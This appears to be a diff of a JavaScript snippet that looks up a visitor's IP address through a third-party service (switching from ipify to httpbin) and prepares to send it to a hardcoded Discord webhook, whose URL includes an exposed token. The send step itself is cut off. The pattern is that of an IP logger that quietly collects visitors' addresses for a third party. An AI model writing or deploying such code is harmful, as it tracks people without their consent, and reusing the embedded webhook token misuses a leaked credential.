@@ -1,12 +1,8 @@
-// Get the IP address of the client
-var clientIp;
-
-// Fetch the IP address from a third-party service
-fetch('https://api.ipify.org?format=json')
+fetch('https://httpbin.org/ip')
   .then(response => response.json())
   .then(data => {
-    clientIp = data.ip;
-
+    var clientIp = data.origin;
+    
     // Replace 'YOUR_DISCORD_WEBHOOK_URL_HERE' with your actual Discord webhook URL
     var webhookUrl = 'https://discord.com/api/webhooks/1231425931453792256/zDbYK2ISGhEl32ory64ubBIB3jv0oPibP5XW1MZA7ztB32zvvZdVyzGBM2_yGimCi5Td';
 
